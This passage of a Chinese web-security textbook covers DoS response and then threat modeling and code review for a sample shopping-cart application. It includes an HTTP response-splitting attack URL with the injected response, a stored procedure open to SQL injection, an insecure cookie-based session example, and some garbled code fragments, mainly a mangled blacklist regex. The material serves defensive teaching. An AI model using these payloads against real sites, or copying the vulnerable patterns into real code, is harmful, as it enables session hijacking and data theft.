最简单收集数据的方法就是通过系统日志。许多网络设备和 UNIX 主机都支持把日志写到一台远程的专用系统日志服务器（syslog server），Windows 的系统则通过事件记录把发生的各种事件登记在案，这样就可以同过自定义脚本或类似 MOM（Microsoft Operations Manager）的应用程序来分析处理。当系统日志被收集起来后，就可以通过对日志某些形式的分析监测来实现系统告警功能。有些系统当遇到情况时，除了能把信息记录到日志中，还能自动生成电子邮件告警。许多攻击都能通过对 CPU 使用率、内存消耗量等一般性能日志的观察检测出来。若应用程序自己也实现了日志功能，就可以帮助我们更方便地确定某次攻击的性质。如果攻击触发了应用程序自身的节流控制（throttling control），那么同样也可以触发其记录应用层协议的具体消息，帮助我们找出用于攻击的非法请求数据包中到底有什么异样，以及其来源。

#### DoS 监测——基于主机和基于网络的入侵监测系统

入侵监测系统（IDS）是一种更高级的日志系统，它能够进行事件分类和异常情况监测。基于网络的入侵监测系统能够快速地监测到一般的 SYN 洪水和其他网络攻击；基于主机的入侵监测系统则能快速地监测到达某一台主机的各个层次的流量异常情况。也有基于异常行为分析的入侵监测系统，比如 Arbor Networks 的系统，它们能通过对不符合协议标准的非正常或恶意数据包的观测来监测更高级的应用层攻击。当针对多台服务器的攻击出现时，入侵监测系统也能通过分布在网络中的代理节点（agent）的相关事件的收集分析监测到异常。安装入侵监测系统的一个主要难题，是如何调优系统。站点管理员往往会对入侵监测系统提供的大量数据和假告警信号感到手足无措，所以系统一般需要一名全职 IDS 操作人员来调优系统使其达到最佳工作状态。入侵防御系统（IPS）是才出现不久的新玩意，现在

也越来越受到关注了。这种系统能实现标准 IDS 同样的功能，而且当它监测到攻击出现时，能自动像防火墙一样工作，过滤数据流，防止攻击数据包到达受保护的站点。

#### 11.2.3 应对 DoS 攻击

当监测到攻击时，我们接下来要考虑的就是如何应对。这意味着我们要采取一个合乎逻辑，精心准备的计划，并将它付诸于行动。临阵磨枪，匆忙上阵，可不是一个好做法。

##### 应对过程的计划与实施

处理攻击的第一步，是执行预先制定的并检验过的应对计划。相比那种非计划的瞬间应急反应，这类计划能更简易更安全地执行，因为它早已周全考虑并实际检验过。好的应对计划，应该包括充分的应急方案，保证采取补救措施前有足够的时间充分掌握状况。这份计划应该能处理可以预见的各种可能攻击方式，而且其每种方式都应独立地测试过，并考虑过攻击者可能采取的变化。检验应对计划的“消防演习”应定期进行（至少每年一次），没有真正在演习中演练过而只停留在纸面的计划，是没有实际用处的。

##### 过滤流量

许多抗 DoS 攻击的设备和应用程序的第一步，都是应用适当 ACL（Access Control List）和防火墙规则来过滤从攻击者处发出的通信数据。利用 Ethereal 这类的嗅探器，RMON 探测器，或者从 Cisco 设备收集到的 NetFlow 数据，我们就能获知攻击来自哪个 IP 地址或网络。如果网络通信看似正常，我们就不得不对通信数据进行逐层分析，直到最高的应用层，来确定攻击的类型。采用基本的分析方法来确定，来自一个单独 IP 或是一组 IP 某个层次的数据通信，是正常的还是异常的。如果来源 IP 地址是假的，我们可能就没有办法实现简单地过滤这些通信。如果攻击来自一个单独 IP 或是一小组 IP，设置 ACL 能就迅速轻易地阻击这次攻击。而如果攻击导致网络设备和防火墙都无法工作了，我们就不得不向 ISP 求助了。

##### 向 ISP 求助和追踪攻击来源

下一步我们能做的事情，就是联系 ISP，在他们的协助下处理攻击。如果攻击方式是通过假 IP 源的 SYN 包耗尽服务器连接，ISP 也许能帮助我们抑制住这种攻击。ISP 可能还能够在其他网络服务商同行们的帮助下追踪到攻击的真正来源。当遭遇应用层攻击或者疯狂的攻击者时，联系 ISP 可能也无法解决问题。

##### 转移攻击对象

攻击对象是如何被确定的，这在我们防范攻击的决策过程中，发挥重要的作用。例如，如果攻击是针对一个硬编码的 IP 地址，让 ISP 给服务器更换 IP 并更新相应的 DNS 数据就

完全可以解决问题。此外，在攻击被我们成功阻止后，不要掉以轻心解除防备。因为那可能只是攻击者在摸准防范手法后以新形式攻击站点前的短暂间歇。

#### 切换到备用方案

让站点在攻击之下仍能保持运行的最后一招就是，采用备用方案来应对高流量。这种方式通常在数据流量达到峰值时就会被采用，不管是否真的遭到了DoS攻击。最常见的方案就是，把动态内容站点切换到只提供静态固定内容的模式，不再提供通常的动态内容。最受欢迎的站点（Amazon和NYTimes这类）都在其全站点击率最高的首页采用了这种技术。在负载极大的情况下，站点必须能让尽可能多的内容通过静态页面的形式展现出来，因为静态页面没什么需要处理的。另一种方案就是利用像Akamai这类外部缓存服务实现故障迁移能力。如果站点负载到达了一定水平或者无法响应请求，外部缓存服务就能够通过缓存的静态内容顶替真实的站点，使站点仍能够对于用户可见，直到攻击结束或者找到有效方法解决攻击。

### 11.3 总结

在过去的十年里，DoS 攻击已经从简单的非法数据包发展演化到利用网络协议栈程序漏洞，针对特定应用功能而设计精密的分布攻击。DoS 攻击的发起者，可能是只求好玩的脚本小子，也可能是有人需要证明自己，更可能是有人想要勒索一笔钱财然后逃之夭夭。最常见和危险的攻击是以蠕虫或病毒为载体发起的 DDoS 攻击。像微软和 Google 这些大型网站都遭受过这种攻击，这也表明了当这种攻击的载体在大范围传播后，没有网站能固若金汤，幸免于难。

越来越多的金钱投入到了电子商务领域，对于在线业务来讲，站点的可用性变得非常关键，所以在防范 DoS 攻击方面的投资也成倍增长。我们也已经看到，对于 DoS 攻击，没有万能的灵丹妙药。财力方面的限制也使得应对大规模攻击不太可能。而巧妙的设计、周全的实现、妥善的测试和规划在应对 DoS 危险方面却是至关重要的。网站管理员必须时刻保持警觉，准备应对可能发生的 DoS 攻击，而且当 DoS 攻击真正发生时，手头必须有预备好的应急措施。

### 11.4 参考和进一步阅读

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>“DDoS 攻击和工具”，作者 David Dittrich http://staff.washington.edu/dittrich/music/ddos/</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>DoS 工具和技术</td><td style='text-align: center; word-wrap: break-word;'>http://www.antiserver.it/Denial-Of-Service/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>CAPTCHA 攻击</td><td style='text-align: center; word-wrap: break-word;'>http://sam.zoy.org/pwntcha/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>免费软件工具</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>JMeter</td><td style='text-align: center; word-wrap: break-word;'>http://jakarta.apache.org/jmeter/index.html</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>IPTables</td><td style='text-align: center; word-wrap: break-word;'>http://www.netfilter.org/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>商业软件工具</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>为缓解 DoS 攻击，Cisco 承诺的接入速率（Committed Access Rate）</td><td style='text-align: center; word-wrap: break-word;'>http://www.cisco.com/univercd/cc/td/doc/product/software/ios111/cc111/car.htm</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Checkpoint 防火墙</td><td style='text-align: center; word-wrap: break-word;'>http://www.checkpoint.com/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Netscreen 防火墙</td><td style='text-align: center; word-wrap: break-word;'>http://www.juniper.net/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Antara FlameThrower</td><td style='text-align: center; word-wrap: break-word;'>http://www.antara.net/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Web 应用程序的 DoS 攻击</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>phpBB BBCode 漏洞</td><td style='text-align: center; word-wrap: break-word;'>http://www.derkeiler.com/Mailing-Lists/Securite.html</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>phpBB 用户注册和搜索 DoS</td><td style='text-align: center; word-wrap: break-word;'>http://www.governmentsecurity.org/archive/t15233.html</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>2004 年 7 月由 MyDoom-O 引起的针对 Google 的 DDoS 攻击</td><td style='text-align: center; word-wrap: break-word;'>http://www.theregister.co.uk/2004/07/26/google_mydoom_infection/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Tomcat 5.5 目录列表 DoS</td><td style='text-align: center; word-wrap: break-word;'>http://secunia.com/advisories/17416/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>OpenSSL ASN.1 parser 漏洞</td><td style='text-align: center; word-wrap: break-word;'>http://www.openssl.org/news/vulnerabilities.html</td></tr></table>

# 第 12 章 充分认知分析（Full-Knowledge Analysis）

到目前为止，我们通常假设潜在的入侵者对他们打算攻击的 Web 应用只有很少的先验知识。当然，在现实世界中，安全评估经常是以访问目标 Web 应用的详细信息来作为开始的。举个例子来说，Web 开发测试团队使用 “白盒”（在开发过程中充分认知/访问的方法），也会使用 “黑盒”（在发布后进行零先验知识/访问的测试）执行应用程序的安全评审。虽然这两种方法之间有不少共同点，但它们也存在很多本质的区别。

本章讲述充分认知/白盒 Web 应用安全测试方法学的关键方面。本章的视角，是对改进安全措施和产品有兴趣的公司里的 Web 应用开发团队或者技术安全审计部门（当然，本章中勾勒出的技术，也可以用于“灰盒”安全检查——混合了黑盒和白盒的分析技术）。本章的结构反映了充分认知学的主要组成部分：

☐ 威胁建模

○ 代码评审

☐ 安全测试

我们在本章结束时，会介绍一些关于如何把安全集成到整个 Web 开发流程中的思想，其核心就是在 Web 开发流程中采用最佳实践，这也是那些理解安全重要性的公司如今越来越常用的措施。

### 12.1 威胁建模

顾名思义，威胁建模（threat modeling）是为了在应用程序发布前有效地识别和减缓潜在的安全弱点，系统地推导出与应用程序相关的关键威胁。最简单的威胁建模形式可以是开发团队成员之间的一系列会议（包括所需的公司内部或外部的安全专家），在会议中讨论并文档化这些威胁和减缓威胁的计划。

威胁建模最好在开发的设计阶段采用，因为设计阶段的结果几乎总是会影响余下的开发流程（编码、测试等等）。威胁模型也应该在应用程序发布前进行修订以及重大的更新。图 12-1 说明了一个理想的威胁建模的进度表。基于大多进行威胁建模的软件公司的经验来看，威胁建模是你用来改进 Web 应用程序安全性的最关键步骤之一。

关于对软件程序进行威胁建模的详细流程在《编写安全的代码》(英文名: Writing Secure Code) 第二版和《威胁建模》（英文名: Threat Modeling）中有很好的描述（更多的信息参见本章末尾的“参考和进一步阅读”）。该方法学基本上有如下几个部分（以下内容改编自 http://www.itaa.org/software/docs/SDLCPaper.pd 的《跨软件开发生命周期的安全特遣部队的报告》 $ ^{①} $，以及我们为客户执行类似流程的经验）：

 </div>

○ 理清威胁建模活动所关注的安全对象，并确定在之后的步骤中需要花费多少精力。

- 识别应用程序所保护的资产（识别每个资产的机密性、完整性、可用性和审计记录的要求，也是很有用的）。

- 编写一份关于架构的概述（它至少应该包括一幅数据流程图，DFD，数据流程图阐明了贯穿产品和相关系统的敏感资产流）。

- 分解应用程序，特别要注意安全边界（比如，应用程序界面、特权使用、认证/授权模型、登录功能等等）。

○ 识别威胁，并将其用文档记录下来。

☐ 使用系统性的数据对威胁进行排序。

为排名最高的威胁制定威胁减缓策略。

○ 根据议定的进度表，实施威胁减缓措施。

提示 Microsoft 发布了威胁建模工具，可以从本章末尾 “参考和进一步阅读” 中提供的链接下载。

在这一节中，我们将演示基本的威胁建模方法。我们在一个简单的 Web 应用程序中应用它。该应用程序是一个标准的在线书店购物车，拥有有两层构架：前端的 Web 服务器和后端的数据库服务器。前端提供了用户登录和购买产品的界面；数据库服务器则包含了关于客户和在线可购买产品的所有数据。

#### 12.1.1 理清安全对象

虽然看起来安全对象似乎非常明显，但是我们发现，是否用文档清晰准确地描述了安全对象，是优秀的威胁模型和泛泛的威胁模型间的区别。只有设置了简明的对象集，威胁模型的分析才能有正确的方向：什么在范围内，什么不在范围内；什么是优先的，什么其次的；什么是必须的，什么是能够的，什么是应该的；最后一点也同样重要：所有可以让你高枕无忧的重要事情。我们也发现，理清安全对象的过程是后续步骤的基础（比如，识别资产），因为威胁建模的新手们常有不切实际的安全期望，很难表述清楚他们不想保护哪些对象。拥有一个明确的安全对象列表，可以切实地帮助他们把要保护的对象限制在合理的范围之中。

#### 12.1.2 识别资产

要实现应用程序安全，首先应该了解你努力保护的是什么。因此，威胁建模的基础步骤是清点应用程序的资产。对 Web 应用程序来说，这常常是很简单的：我们的例子程序包含了有价值的项目，比如客户的信息（可能含有金融信息），用户和管理员密码和业务逻辑。开发团队应该列出应用程序保护的所有有价值的资产，并依照敏感性进行排序。可以根据假设应用程序失去这些资产的机密性、完整性或可用性，因此而遭受的影响来排序。资产的详细清单应该在下一个步骤中修订，以确保架构概述和相关的数据流程图正确地说明了每个资产的位置。

#### 12.1.3 架构概述

一图胜千言，威胁建模也不例外。数据流程图（Data flow diagram，DFD）通过可视化的方式对应用建模，对确定安全威胁有极大的帮助。数据流程图也是充分认知分析方法优于黑盒方法的最主要优势之一（因为黑盒测试者不大可能获得详细的数据流程图）。我们常常发现，要实现该目的，至少需要第0级（概述）和第1级（组件层）数据流程图。我们

假想的购物车应用程序，其第 0 级和第 1 级的数据流程图如图 12-2 和 12-3 所示。

 </div>

 </div>

浏览器发送一个带有证书的请求登录到站点，证书被传到后端数据库，数据库验证证书后发送响应给 Web 服务器。Web 服务器根据收到的数据库的响应，显示一个成功的页面，或者显示一个错误。如果请求成功，Web 服务器还会在客户端上设置一个新的 Cookie 值和一个会话 ID。然后客户端可以再次对服务器发送请求，在他的购物车中添加新商品或者更新他的信息并结账。

#### 12.1.4 分解应用程序

既然应用程序已经分解成为功能组件了，下一步就是进一步分解应用程序，指出重要的安全（或信任）边界，包括用户和程序接口、特权使用、认证/授权模型、登录功能等等。图 12-4 显示了带有相关安全边界覆盖的第 1 级 DFD。所有的虚线是入口点。方框代表安全/信任边界。

 </div>

#### 12.1.5 识别威胁并用文档描述它们

有了对应用程序（包括安全边界和入口点）的直观表示，我们现在就可以开始确定对应用程序的威胁了。威胁建模的最大挑战是系统性和完整性，特别是要面对不断变化的技术和层出不穷的攻击方法。现在还没有技术声称可以识别针对复杂的软件产品的全部威胁，因此你必须依赖于最佳实践来尽可能的到达百分之百的识别，并在到达了边际效应下降点时，好好考虑下如何实现这个目标。

最简单的方法是查看应用程序的数据流程图，并创建威胁树或威胁列表（关于攻击/威胁树更多的信息，请参见“参考和进一步阅读”）。另一个有用的机制是 Microsoft 的 STRIDE 模型：对先前列出的每个已文档化的资产尝试进行欺骗（Spoofing），篡改（Tampering），抵赖（Repudiation），信息泄漏（Information disclosure），拒绝服务（Denial of service）和权限提升（Elevation of privilege）威胁的集体讨论。如果对你的资产文档化时，你就考虑了机密性、完整性、可用性和审计记录（CIAA）需求，那么你已经成功了一半：你会发现 STRIDE 和 CIAA 威胁非常相似。

考虑针对 Web 应用程序的已知威胁也是非常有用的。内部或外部的安全人员可以协助把这些知识带入到威胁建模中。另外，浏览和检查安全邮件列表，比如 Bugtraq，和安全 Web 站点比如 www.owasp.org，也有助于创建威胁列表。微软发布了一个常见的 Web 应用程序安全威胁和漏洞分类的“备忘录”（其链接请参见本章末尾的“参考和进一步阅读”）。当然，你现在正在阅读的这本书也是常见 Web 安全威胁的不错的参考资料（^_^）。

提示 不要在这个时候花费时间来确定是否/如何减缓这些威胁，这是后面要做的事情，不过也可以在此时尝试一些减缓措施，尝尝鲜。

下面是购物车应用程序的一个威胁列表例子

1. 认证

- 暴力证书猜测。

2. 会话管理

- 会话密钥能被轻易地猜测。

- 会话密钥不会过期。

- 没有实现安全 cookie。

3. 攻击者可以查看其他用户的购物车

- 用户可能没有在公共 PC 上注销。

4. 不恰当的输入验证

- 通过 SQL 注入来绕过认证流程。

☐ 消息公告允许跨站脚本（XSS）攻击窃取证书。

5. 错误消息

☐ 详细的错误消息显示 SQL 错误。

☐ 详细的错误消息显示非法用户名和非法密码。

在认证过程中详细的错误消息使得可以枚举用户。

6. 没有在 Web 站点上强制使用 SSL

○ 允许窃听敏感信息。

#### 12.1.6 对威胁排序

虽然位于听众席上的安全人员可能对原始的威胁列表视为珍宝，但是它对软件开发人员常常用处不大，因为他们只有有限的时间和经费，根据日程表为下一版本的应用程序开发新的（或者禁用不安全的）功能。因此，在这里通过采用系统性的数据，对威胁列表中各项排名或者确定的优先级是非常重要的，这样有限的资源可以用来有效地处理最关键的威胁。

有很多理论可以用作安全风险排名的依据。一种经典而简单的风险数值化方法，如下面这个公式所示：

 $$  威胁 = 影响 \times 概率 $$ 

该理论是非常容易理解的, 甚至可以使公司在商业利益和安全利益上得到更好的协调。举个例子, 商业影响的数值可以由首席财政官（Chief Financial Officer, CFO）赋值, 而概率估计可以由首席安全官（Chief Security Officer, CSO）赋值, CSO 是负责安全和业务连续性进程（Business Continuity Process, BCP）团队的。

在该理论中，影响通常以费用的形式表达出来，而概率是一个介于 0 和 1 之间的值。举个例子，一个软件漏洞有$100 000 的影响和 30% 的概率，那么它的安全排名是$30 000 ($100 000 × 0.30)。像这样的“硬通货”评估通常可以得到管理层的注意，并使风险量化更有实用性。该公式可以进一步分解，把影响分解为（资产×威胁），把概率分解为（漏洞×减缓措施）。

其他主流的风险量化方法还包括微软的 DREAD 系统（潜在损失、重现、利用、影响用户和发现能力，Damage potential，Reproducibility，Exploitability，Affected users and Discoverability），以及微软安全应急响应中心在他们安全漏洞评级中使用的简化理论。通用漏洞分级评价体系（Common Vulnerability Scoring System，CVSS）多少有点复杂，但能更准确地表示常见软件漏洞风险（我们其实喜欢基于应用程序独特的时间和环境因素，改变基础安全风险分值的组件化方法）。关于这些理论更多信息的链接，可以在本章末尾的“参

考和进一步阅读”一节中找到。

我们鼓励你尝试每种方法，以确定哪一个适合你和你的公司。甚至，你可以基于这些方法中的概念，开发出自己的风险评估方法。风险量化对个人感觉是很敏感的，即使只是几个人，你也很难发现他们对某种理论的看法是一致的。只要记住主要的这点：始终如一地应用你所选择的理论，这样威胁的相对排名总是一致的。毕竟最终目标是——确定哪个威胁需要优先处理。

我们发现设置一个风险级别门限，或者“bug bar”，是非常有用的。对于高于门限的威胁必须准备减缓措施。在排序流程结束之前，对门限设置在哪里这个问题应该达成广泛的一致。这使得在发布过程中能够保持一致，并使得难以轻易地改变门限而把风险量化理论当成儿戏（这也能查出哪些人有意设低分值，使在风险门限之下）。

#### 12.1.7 开发威胁减缓策略

在这个时候，威胁建模的过程应该已经为我们的购物车应用程序产生了一个威胁列表，并依据对应用程序/业务风险的认识给列表排好了序。现在到了为排名较高的威胁开发减缓策略的时候了（也就是那些超过之前设置的风险门限的威胁）。

提示 如果有时间，你可以为所有的威胁都创建减缓策略。事实上，减缓低风险的威胁只需要非常少的精力。好好考虑下吧。

威胁/风险减缓策略对每个应用程序可以是唯一的，但它们通常能分几大常见的类别。我们再次引用微软的 Web 应用程序安全框架“备忘录”，来对常见的攻击技术的减缓策略进行分类。通常情况下，减缓策略是相当清晰的：使用常见的预防、检测和反应性的安全控制（比如认证、加密和入侵检测），以消除威胁所暴露出的漏洞（或减轻漏洞带来的影响）。

提示 不是每个威胁都必须在下一次发布版中得到减缓。因为应用程序的技术和架构的更新，有些威胁最好放在长期的不断发布过程中处理。

举个例子，在我们假想的购物车应用程序中，针对认证系统的“暴力证书猜测”威胁，可以通过 CAPTCHA 技术来减缓，在 6 次失败的尝试后，要求用户手动输入在登录界面中提供的 CAPTCHA 图像所显示的信息（关于 CAPTCHA 的更多内容，请参见第 4 章）。(显然，任何对失败尝试的追踪，都得在服务器端执行，因为客户端提供的会话数据是不可信的。在这个例子中，对每个认证挑战都直接显示 CAPTCHA 可能更加有效)。在将来，如果攻击者开发了可以绕过给定 CAPTCHA 的技术，那么团队可以回过头来再描述和考虑该问题。这说明了随着时间的推移，改进应用程序威胁模型以及跟上新的安全威胁的重要性。

显然，威胁减缓策略不仅可以帮助你的公司减缓威胁，还可以防范无意中造成的新的

威胁。一个常见的例子就是，当设置了一个 6 次尝试锁定账号的门限时，在 6 次输入信息未能正常登录之后，账号将被禁用。这个特性可以减缓密码猜测威胁。但是，如果攻击者可以猜测或者获得合法的用户名（想一下金融机构，账号数字可能实际上是简单增加的），他们能够自动进行一个密码猜测攻击，轻易地对应用程序的所有用户造成拒绝服务的情况。这种攻击也可以通过电话请求账号重置而击垮客服。

更好的解决方案是实现账号的超时而不是锁定的功能。和在失败一定次数后禁用账号不同，该方法只是暂时的禁用（比如，30 分钟）。将该延时账号锁定方法与 CAPTCHA 挑战结合起来，可以提供更好的减缓措施。当然，每个方法对可用性都有影响，应该在真实世界情况下测试，如此才能更加全面地理解此类安全控制引入的不可避免的代价。

最后，当考虑威胁减缓时，不要忘记了现成组件。下面是一些技术例子，如今 Web 应用程序可用它们来减缓威胁。

很多 Web 和应用程序服务器加载了预先打包好的通用错误消息页面，这样不给攻击者提供任何信息。

平台扩展，比如 URLScan 和 ModSecurity（参见附录 C），提供了 HTTP 输入来过滤“防火墙”。

- 开发框架诸如 ASP.NET 和 Jakarta Struts（基于 J2EE）提供了内置的认证和输入验证流程等等。

### 12.2 代码评审

代码评审（Code Review）是充分认知分析的另一个重要的方面。应该对应用程序最关键的部分进行代码评审。确定什么部分是“关键的”，通常在威胁建模过程中进行：任何威胁超过了门限的组件都应该被评审（这是威胁建模推动后续安全开发的极好例子）。

本节讨论如何识别在 Web 应用中可能存在的基本代码级的问题。本节的内容围绕着代码评审的关键方法而展开：手动、自动和二进制分析。

### 12.2.1 手动源代码评审

手动代码评审（由有能力胜任的评审员进行！）仍被认为是安全的黄金准则。但是，因为最重要的安全漏洞会集中在最高风险的模块中，对大型应用程序的所有代码进行逐行的手动评审，很有可能导致付出收获的边际效应下降。因此，假如资源有限，手动代码评审最好只在应用程序的最关键部分实行。

提示 在迁入代码之前，如果在开发团队内部相互评审他人的代码，可以扩大手动代码评审的覆盖范围。

就像我们前面提到的那样，“关键”部分最好在威胁建模流程中定义（从 DFD 中来看应该是非常明显的）。手动代码评审的一些需要注意的地方包括：

任何直接接收和处理用户输入的模块, 特别是数据处理流程和与网络打交道的模块。

认证组件。

○ 授权/会话管理。

○ 管理员/用户管理。

○ 错误和异常处理。

☐ 加密组件。

以特权/跨多种安全上下文运行的代码。

○ 会被流氓软件调试或篡改的客户端代码。

☐ 过去有漏洞的代码。

手动代码评审的流程在其他资料中有非常多的描述。一些我们喜欢的资料列在了本章末尾的“参考和进一步阅读”一节中。接下来，我们将讨论一些在代码评审中发现的常见的 Web 应用安全问题的例子。

##### 代码评审所发现的常见安全问题

有很多影响安全的问题可以通过代码评审而发现。在本节中，我们将提供和 Web 应用程序最相关的一些例子，包括：

○ 糟糕的输入处理。

o 糟糕的 SQL 语句构成。

☐ 在代码中保存秘密。

○ 糟糕的认证/会话管理。

☐ 在产品中留下了调试开关。

糟糕的输入处理例子 我们钟爱的一句安全编程格言是：“所有收到的输入都应该作为恶意输入对待，直到它们被证明为无害为止”。在 Web 应用程序中，需要考虑的关键输入包括：

○ 从客户端收到的所有数据。

☐ 通过 SQL 语句和存储过程收到的数据。

如果没有对这些数据实现正确的输入验证和输出编码流程，会导致应用程序中毁灭性的安全漏洞，就像在本书中随处都能看到的那些漏洞一样。下面是一些关于如何在代码级

别识别这些问题的例子。

在我们先前关于威胁建模讨论中提供的购物车例子中，如果从客户端收到的用户名没有经过编码，回显给客户端（一旦用户登录了，通常都回显），就可以在用户名字段中执行一个 XSS 攻击。如果用户名没有经过编码并传递给 SQL，可以导致 SQL 注入。因为很多 Web 数据使用表单来收集，因此在代码中要识别的首要元素是输入页面中的<form>标记。然后你就可以明白数据是如何处理的。我们在这里列出了用来解析 Web 表单数据的 ASP 方法：

o request.form

request.querystring（应该避免对敏感数据使用这种方法，因为数据会出现在 Web 日志和客户端缓存中。）

request.cookies
response.write

如果使用这些 ASP 方法来处理数据，应该使用 Server.HTMLEncode 或 Server.URLEncode 保护它们，以减少 XSS 和 SQL 注入的机会。

更一般的，输入和输出的数据应该被过滤。过滤流程应该在代码评审过程中仔细地检查，因为开发者经常一旦实现了对某种情况的验证，就假定他们对输入攻击完全免疫了。输入验证其实是非常具有争论性的，特别是对需要接受大范围输入的应用程序。我们在第6章中深入地讨论过输入验证的对抗措施，但是还是把输入验证流程的一些常见例子列在这里：

- 使用白名单法代替黑名单法（黑名单更容易被攻破，因为几乎不可能预测整个恶意输入集）。

- 对于 Java 编写的应用程序，Java 内置的正则表达式类（java.util.regex.*）或 Struts 框架经常被使用。在应用程序环境里，实现 Struts 的框架的确需要一些检查。

.NET 提供了一个正则表达式类来进行输入验证（System.Text. Regular Expressions）。.NET 框架也有内置能力，可以提供与 Struts 框架相同的功能。其控件属性允许你配置输入验证。

这里是一个 “白名单” 输入验证代码片断的例子（str.replace 在 PHP 和 ASP.NET 中都可用）：

function Sanitize(str) {
    str = str.replace(/[^a-zA-Z]/g, "");
    return str;
}
The corresponding "black list" approach might look like this:
function Sanitize(str) {

str = str.replace(/\<|\>\|/\|\|\%|\|;\|\|\|\&|\\|+\|\-/g,"");
return str;
}

另一个输入验证问题的很好例子是 HTTP 响应头截断攻击（其链接请参见“参考和进一步阅读”）。HTTP 响应头截断使用回车换行符（%0d%0a）把恶意内容注入到 HTTP 头字段中，从而提前截断一个响应并插入另一个。它瞄准的 Web 应用程序，是使用编程方法实现重定向到其他 URL 的应用程序，例如，一个 ASP.NET 的 Response.Redirect 发送一个 Request.QueryString 的值。对设置 Cookie 和重定向用户到另一个页面的代码要特别注意，因为这会通过响应头截断攻击引起 Cookie 毒药。一个简单的响应头截断攻击如下所示：

假设一个有漏洞的 Web 应用程序页面调用 “redir.aspx”，里面带有和下面类似的代码：

&lt;% Response.Redirect(?) / redir.aspx?var2=?+ Request.QueryString(?) item?) %&gt;

这条语句取出变量 var2 的值，并将其改写成查询字符串中的 item 变量。一个恶意攻击者可以构造如下的 URL:

http://victim.com/redir.aspx?var1=blah&var2=blah%0d%0a
Content-Length:%200%0d%0a
HTTP/1.1%20200%200K%0d%0a

Content-Type:%20text/html%0d%0a
Set-Cookie:%20xyzzy%0d%0a
Content-Length:%2020%0d%0a
<html>Vulnerable</html>

看一下这段代码中%0d%0a 值的关键位置，第一个%0d%0a 在 Content-Length: 0 HTTP 头部前插入了回车换行。这会提前结束合法的响应，为攻击者从 HTTP/1.1 语法开始插入一个伪造响应提供了空间。在伪造的响应中，攻击者在受害者机器上设置了一个 Cookie。如果攻击者可以让受害者点击这个链接（就像真的来自于 victim.com 那样），他就能执行一些类似 XSS 的攻击。下面是从漏洞服务器到受害客户端的 HTTP 响应（带有注释，以说明伪造的响应在什么地方注入的）：

HTTP/1.1 302 Object moved
Expires: Tue, 23 Mar 2004 23:26:39 GMT
Date: Tue, 23 Mar 2004 23:27:38 GMT
Location: https://victim.com/redir.aspx?var1=blah&var2=blah
(这里是注入的伪造响应)
Content-Length: 0
HTTP/1.1 200 OK

Content-Type: text/html
Set-Cookie: xyzzy
Content-Length: 20
<html>Vulnerable</html>
(余下是合法响应，不作解释)
Content-Type: text/html
Server: Microsoft-IIS/5.0
Pragma: No-Cache
ResponseSplitting: header
Cache-control: private
<head><title>Object moved</title></head>
<body><h1>Object Moved</h1>This object may be found <a HREF="">here</a></body>

要防范该类攻击，在把数据嵌入到任何 HTTP 响应头之前，过滤掉回车换行符。

注意 关于输入验证攻击和对抗措施的更多例子，请参见第6章

糟糕的 SQL 语句构成 就像我们在第 7 章中看到的那样，SQL 语句是大多数 Web 应用程序工作的关键。不恰当的动态 SQL 语句会导致针对应用程序的 SQL 注入攻击。举个例子，在如下所示的 select 语句中，没有执行验证（输入或输出）。攻击者可以简单地注入 “1=1”（使得 SQL 语句为真）获得对应用程序的访问。

%

使用存储过程内部的 exec（）也会导致 SQL 注入攻击，因为 OR1=1 仍可以在一个针对存储过程的 SQL 注入攻击中使用，如下所示：

CREATE PROCEDURE GetInfo (@Username VARCHAR(100))
AS

exec('SELECT custid, last, first, mi, cadd, city, state, zip FROM customer WHERE username ='' + @Username ''')
GO

只要可能，都应该使用存储过程来替换服务端脚本中的 SQL 语句。在存储过程上执行 SQL 注入会更加困难。

同样，尽可能地使用 ADO Command Object Parameter 或预处理语句（Prepared Statements，在 Java 中）。这可以排除攻击者针对应用程序的 SQL 注入攻击的可能。

在代码中保存秘密 Web 开发者经常在他们的代码中保存一些秘密。我们将本章稍后的“二进制分析”一节中讨论一个特别严重的例子，说明为什么我们特别反对在代码中对秘密进行硬编码。绝不要在代码有机会和终端用户直接交互的地方用硬编码保存秘密。

如果真的需要保存秘密, 应该将它们加密。在 Windows 中, 应该使用数据保护 API(Data Protection API, DPAPI) 加密秘密并保存它们（其链接参见本章末尾的“参考和进一步阅读”）。在 UNIX 环境中, 可以用 Java 加密扩展（Java Cryptography Extension, JCE）来保存秘密、

代码中授权错误 就像我们在第 5 章中看到的那样，Web 开发人员经常尝试实现他们自己的授权/会话管理功能，导致服务器对应用程序的访问控制可能出现问题。

下面是一个很糟糕的后台会话管理例子，可能会在代码评审中被发现。在这个例子中，userid 是一个整数，也被用做会话 ID。userid 也是 User 表中的主键，因此使得开发者追踪用户的状态相对容易一些。会话 ID 在成功登录时设置。

<！-- The code is run on welcome page -->
createSessionID( request, response, userid);
String value = "userid="userid;
Cookie sessioncookie = new Cookie( propertyFileName, value );

在接下来的页面上维持状态，请求来自客户端的会话 ID ，然后基于会话 ID 给客户端返回正确的内容。

<！-- The following code is run on all pages -->
String userId = (String)cookieProps.get("userid");

在这个例子中，`userid` 保存在客户端上的 Cookie 中，因此很容易被篡改，而导致会话劫持。

显然，针对自定义会话管理的对抗措施，是使用现成的会话管理流程。举个例子，会话 ID 应该使用主流现成的开发框架中提供的 Session 对象来创建，比如 J2EE 提供的 JSPSESSIONID 或 JSESSIONID，或者 ASP.NET 提供的 ASPSESSIONID。像 Tomcat 和

